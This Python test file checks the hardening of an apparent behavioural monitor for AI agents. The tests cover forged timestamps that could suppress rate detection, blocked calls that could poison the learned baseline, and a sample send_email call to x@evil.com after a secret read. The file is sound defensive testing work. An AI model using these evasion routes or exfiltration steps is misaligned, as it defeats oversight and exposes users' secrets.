"""Regression tests for the behavioural monitor hardening."""
from aegis.config import AegisConfig
from aegis.monitor import BehaviorMonitor
from aegis.types import ToolCall


def test_rate_uses_monotonic_clock_not_caller_ts():
    # A forged, far-apart AgentRequest.ts must not suppress rate-spike detection.
    cfg = AegisConfig(rate_limit=5, rate_window_s=1.0)
    bm = BehaviorMonitor(cfg)
    tc = ToolCall("web_search", {})
    scores = [bm.observe("spoofer", tc, now=i * 10_000.0).score for i in range(12)]
    assert any(s > 0 for s in scores), "rate signal was suppressed by forged ts"


def test_profile_store_is_bounded():
    cfg = AegisConfig(max_agents=10)
    bm = BehaviorMonitor(cfg)
    for i in range(200):
        bm.observe(f"agent-{i}", ToolCall("web_search", {}))
    assert bm.agent_count() <= 10


def test_blocked_calls_do_not_train_baseline():
    # observe() alone must not add the tool to the learned baseline; only
    # record_allow does. So a repeated blocked tool stays 'novel'.
    cfg = AegisConfig()
    bm = BehaviorMonitor(cfg)
    tc = ToolCall("read_file", {})
    # three allowed calls of a DIFFERENT tool to establish a baseline
    for _ in range(3):
        bm.observe("agent", ToolCall("web_search", {}))
        bm.record_allow("agent", ToolCall("web_search", {}))
    # a blocked read_file should not be learned even if observed repeatedly
    for _ in range(5):
        bm.observe("agent", tc)
        bm.record_block("agent")
    r = bm.observe("agent", tc)
    assert any("novel tool" in x for x in r.reasons), "blocked tool trained the baseline"


def test_recent_blocks_are_time_windowed():
    cfg = AegisConfig(block_window_s=60.0)
    clock = {"t": 1000.0}
    bm = BehaviorMonitor(cfg, clock=lambda: clock["t"])
    bm.record_block("a")
    r1 = bm.observe("a", ToolCall("web_search", {}))
    assert any("recent policy blocks" in x for x in r1.reasons)
    # advance well past the window: the block should no longer count
    clock["t"] += 120.0
    r2 = bm.observe("a", ToolCall("web_search", {}))
    assert not any("recent policy blocks" in x for x in r2.reasons)


def test_sensitive_read_window_expires():
    cfg = AegisConfig(sensitive_read_window_s=30.0)
    clock = {"t": 0.0}
    bm = BehaviorMonitor(cfg, clock=lambda: clock["t"])
    bm.record_allow("a", ToolCall("read_secret", {}))
    # egress long after the read is not treated as read-then-exfiltrate
    clock["t"] = 100.0
    r = bm.observe("a", ToolCall("send_email", {"to": "x@evil.com", "body": "hi"}))
    assert not any("read-then-exfiltrate" in x for x in r.reasons)
